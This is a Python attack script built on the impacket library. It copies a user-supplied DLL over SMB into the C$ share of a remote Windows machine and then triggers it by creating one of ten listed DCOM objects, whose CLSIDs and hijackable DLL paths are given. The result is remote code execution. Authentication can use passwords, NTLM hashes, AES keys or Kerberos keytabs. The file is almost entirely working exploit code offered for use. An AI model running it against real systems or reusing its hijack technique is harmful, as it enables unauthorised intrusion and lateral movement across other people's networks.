#!/usr/bin/env python

from __future__ import division
from __future__ import print_function
import argparse
import logging
import sys

from impacket import version
from impacket.dcerpc.v5.dcom.oaut import IID_IDispatch, string_to_bin, IDispatch
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.smbconnection import SMBConnection, SMB_DIALECT, SMB2_DIALECT_002, SMB2_DIALECT_21
from impacket.krb5.keytab import Keytab

OPPORTUNITIES = {
    "WordPadDocument":      ("73FDDC80-AEA9-101A-98A7-00AA00374959", "Program Files\\Windows NT\\Accessories\\XmlLite.dll"),
    "ContactReadingPane":   ("13D3C4B8-B179-4ebb-BF62-F704173E7448", "Program Files\\Common Files\\System\\UxTheme.dll"),
    "UserOOBE":             ("ca8c87c1-929d-45ba-94db-ef8e6cb346ad", "Windows\\System32\\oobe\\USERENV.dll"),
    "MSDAINITIALIZE":       ("2206CDB0-19C1-11D1-89E0-00C04FD7A829", "Program Files\\Common Files\\System\\Ole DB\\bcrypt.dll"),
    "ShapeCollector":       ("1E2D67D6-F596-4640-84F6-CE09D630E983", "Program Files\\Common Files\\Microsoft Shared\\ink\\DUI70.dll"),
    "WBEMUnsecuredApt":     ("49BD2028-1523-11D1-AD79-00C04FD8FDFF", "Windows\\System32\\wbem\\wbemcomn.dll"),
    "WBEMActiveScript":     ("266C72E7-62E8-11D1-AD89-00C04FD8FDFF", "Windows\\System32\\wbem\\wbemcomn.dll"),
    "VoiceToastCallback":   ("265b1075-d22b-41eb-bc97-87568f3e6dab", "Windows\\System32\\WinBioPlugIns\\MFPlat.dll"),
    "AddToWMPList":         ("45597c98-80f6-4549-84ff-752cf55e2d29", "Program Files (x86)\\Windows Media Player\\ATL.dll"),
    "WMPBurnCD":            ("cdc32574-7521-4124-90c3-8d5605a34933", "Program Files (x86)\\Windows Media Player\\PROPSYS.dll"),
}

class DCOMHIJACK:
    def __init__(self, username='', password='', domain='', dcomObject='', file=None, hashes=None, aesKey=None, doKerberos=False, kdcHost=None):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__file = file
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__dcomObject = dcomObject
        if file is None:
            self.__file = OPPORTUNITIES[self.__dcomObject][1].split('\\')[-1]
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def do_put(self, addr):
        smbConnection = SMBConnection(addr, addr)
        if self.__doKerberos is False:
            smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
        else:
            smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                        self.__nthash, self.__aesKey, kdcHost=self.__kdcHost)

        dialect = smbConnection.getDialect()
        if dialect == SMB_DIALECT:
            logging.info("SMBv1 dialect used")
        elif dialect == SMB2_DIALECT_002:
            logging.info("SMBv2.0 dialect used")
        elif dialect == SMB2_DIALECT_21:
            logging.info("SMBv2.1 dialect used")
        else:
            logging.info("SMBv3.0 dialect used")

        try:
            fh = open(self.__file, 'rb')
            dst_path = OPPORTUNITIES[self.__dcomObject][1]
            smbConnection.putFile('C$', dst_path, fh.read)
            fh.close()

        except  (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
            if smbConnection is not None:
                smbConnection.logoff()
            sys.stdout.flush()
            sys.exit(1)

        if smbConnection is not None:
            smbConnection.logoff()

    def instantiate(self, addr):
        dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                              self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)

        try:
            print('CLSID: ', OPPORTUNITIES[self.__dcomObject][0])
            IDispatch(dcom.CoCreateInstanceEx(string_to_bin(OPPORTUNITIES[self.__dcomObject][0]), IID_IDispatch))

        except  (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
            dcom.disconnect()
            sys.stdout.flush()
            sys.exit(1)

        dcom.disconnect()

class AuthFileSyntaxError(Exception):
    def __init__(self, path, lineno, reason):
        self.path=path
        self.lineno=lineno
        self.reason=reason

    def __str__(self):
        return 'Syntax error in auth file %s line %d: %s' % (
            self.path, self.lineno, self.reason )

def load_smbclient_auth_file(path):
    lineno=0
    domain=None
    username=None
    password=None
    for line in open(path):
        lineno+=1

        line = line.strip()

        if line.startswith('#') or line=='':
            continue

        parts = line.split('=',1)
        if len(parts) != 2:
            raise AuthFileSyntaxError(path, lineno, 'No "=" present in line')

        (k,v) = (parts[0].strip(), parts[1].strip())

        if k=='username':
            username=v
        elif k=='password':
            password=v
        elif k=='domain':
            domain=v
        else:
            raise AuthFileSyntaxError(path, lineno, 'Unknown option %s' % repr(k))

    return (domain, username, password)

if __name__ == '__main__':
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help = True, description = "Copies a DLL to the target machine and executes "
                                                                    "it by instantiating a COM object.")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-object', choices=OPPORTUNITIES.keys(), nargs='?', help='DCOM object to be used to initiate the DLL hijack')
    parser.add_argument('-file', action='store', help='DLL file to be uploaded')
    
    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                       'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                       'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-A', action="store", metavar = "authfile", help="smbclient/mount.cifs-style authentication file. "
                                                                        "See smbclient man page's -A option.")
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()
    logger.init(options.ts)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, address = parse_target(options.target)

    try:
        if options.object is None:
            parser.print_help()
            sys.exit(1)

        if options.A is not None:
            (domain, username, password) = load_smbclient_auth_file(options.A)
            logging.debug('loaded smbclient auth file: domain=%s, username=%s, password=%s' % (repr(domain), repr(username), repr(password)))

        if domain is None:
            domain = ''

        if options.keytab is not None:
            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
            options.k = True

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass
            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True

        executer = DCOMHIJACK(username, password, domain, options.object, options.file, options.hashes, options.aesKey, options.k, options.dc_ip)
        executer.do_put(address)
        executer.instantiate(address)
    except (Exception, KeyboardInterrupt) as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(e))
    sys.exit(0)
